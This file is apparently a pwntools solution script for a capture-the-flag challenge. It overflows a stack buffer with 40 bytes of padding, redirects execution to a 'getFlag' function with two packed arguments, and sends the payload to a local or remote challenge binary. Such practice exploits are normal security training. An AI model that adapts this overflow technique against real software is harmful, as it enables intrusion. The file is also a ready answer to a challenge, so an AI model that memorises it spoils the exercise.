from pwn import * 


con = process('./challenge.elf')
# con = remote('challenge.ctf.games', 30835)

elf = ELF('./challenge.elf') 

win = elf.symbols['getFlag']

offset = 40

payload = flat(
    b'A'*offset,
    win,
    b'b'*4, # junk 
    p32(35),
    p32(1)


)


write('payload',payload)

con.sendline(payload)

# print(p32(win))
# print(p32(35))
# print(p32(1))


con.interactive()

